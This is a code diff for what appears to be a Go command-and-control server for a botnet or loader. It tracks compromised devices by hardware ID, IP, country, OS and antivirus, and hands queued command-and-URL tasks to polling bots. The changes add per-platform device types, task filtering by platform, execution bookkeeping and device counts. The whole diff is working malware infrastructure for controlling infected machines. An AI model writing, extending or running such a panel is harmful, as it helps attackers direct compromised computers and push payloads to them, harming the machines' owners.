@@ -169,6 +169,7 @@ func createDatabase(dbFileName string) {
 	"os"	TEXT NOT NULL,
 	"status"	TEXT NOT NULL,
 	"lastping"	INTEGER NOT NULL,
+	"type"	TEXT NOT NULL,
 	PRIMARY KEY("hwid")
 )`
 
@@ -295,6 +296,7 @@ func printTopAntivirus(channel ssh.Channel) {
 
 // super mysterious task
 func getTask(data string) []byte {
+	db.Exec(`UPDATE tasks SET status = "complete" WHERE executions_h = executions_n`)
 	formatted_data := strings.Split(data, "|")
 	var exists bool
 	checkquery := `SELECT EXISTS(SELECT 1 FROM devices WHERE hwid = ? LIMIT 1)`
@@ -303,7 +305,7 @@ func getTask(data string) []byte {
 		return nil
 	}
 	if !exists {
-		db.Exec("INSERT INTO devices(hwid,ip,nation,os,av,lastping,status) VALUES(?,?,?,?,?,?,?)", formatted_data[1], formatted_data[2], formatted_data[3], formatted_data[4], formatted_data[5], time.Now().Unix(), "online")
+		db.Exec("INSERT INTO devices(hwid,ip,nation,os,av,type,lastping,status) VALUES(?,?,?,?,?,?,?,?)", formatted_data[1], formatted_data[2], formatted_data[3], formatted_data[4], formatted_data[5], formatted_data[6], time.Now().Unix(), "online")
 		return []byte("THISTLE|EMPTY")
 	}
 	fmt.Println("Device exists")
@@ -312,13 +314,16 @@ func getTask(data string) []byte {
 
 	// Find the newest task
 	var task Task
+	fmt.Println("Task filter is: ", formatted_data[6])
 	query := `SELECT taskid, command, url, executions_h, executions_n, filters, created 
               FROM tasks 
+			  WHERE filters = ? AND status="active"
               ORDER BY created ASC 
               LIMIT 1`
-	err = db.QueryRow(query).Scan(&task.TaskID, &task.Command, &task.URL, &task.ExecutionsH, &task.ExecutionsN, &task.Filters, &task.Created)
+	err = db.QueryRow(query, formatted_data[6]).Scan(&task.TaskID, &task.Command, &task.URL, &task.ExecutionsH, &task.ExecutionsN, &task.Filters, &task.Created)
 	if err != nil {
 		if err == sql.ErrNoRows {
+			fmt.Println("Nothing returned")
 			return []byte("THISTLE|EMPTY")
 		}
 		fmt.Println(err)
@@ -337,7 +342,7 @@ func getTask(data string) []byte {
 	// If the user's HWID is not found, return the task
 	if count == 0 {
 		db.Exec("UPDATE tasks SET executions_h = executions_h +1 WHERE taskid = ?", task.TaskID)
-		db.Exec("UPDATE tasks SET status = complete WHERE executions_h = executions_n")
+		db.Exec(`UPDATE tasks SET status = "complete" WHERE executions_h = executions_n`)
 		db.Exec("INSERT INTO completed_tasks(taskid,hwid) VALUES(?,?)", task.TaskID, formatted_data[1])
 		return []byte("THISTLE" + "|" + task.Command + "|" + task.URL)
 	}
@@ -375,4 +380,57 @@ func GetCounts() (string, string, string) {
 	total := onlineCount + offlineCount
 
 	return fmt.Sprintf("%d", onlineCount), fmt.Sprintf("%d", offlineCount), fmt.Sprintf("%d", total)
+}
+
+func GetDeviceCounts(db *sql.DB) (string, string, string, error) {
+	query := `
+		SELECT 
+			type,
+			COUNT(*) as count
+		FROM 
+			devices
+		GROUP BY 
+			type
+		HAVING 
+			type IN ('win', 'linux', 'other')
+	`
+
+	// Execute the query
+	rows, err := db.Query(query)
+	if err != nil {
+		return "", "", "", err
+	}
+	defer rows.Close()
+
+	// Initialize counters
+	countWin := 0
+	countLinux := 0
+	countOther := 0
+
+	// Process the results
+	for rows.Next() {
+		var typ string
+		var count int
+		err := rows.Scan(&typ, &count)
+		if err != nil {
+			return "", "", "", err
+		}
+
+		switch typ {
+		case "win":
+			countWin = count
+		case "linux":
+			countLinux = count
+		case "other":
+			countOther = count
+		}
+	}
+
+	// Check for errors from iterating over rows
+	if err := rows.Err(); err != nil {
+		return "", "", "", err
+	}
+
+	// Convert counts to strings
+	return fmt.Sprintf("%d", countWin), fmt.Sprintf("%d", countLinux), fmt.Sprintf("%d", countOther), nil
 }
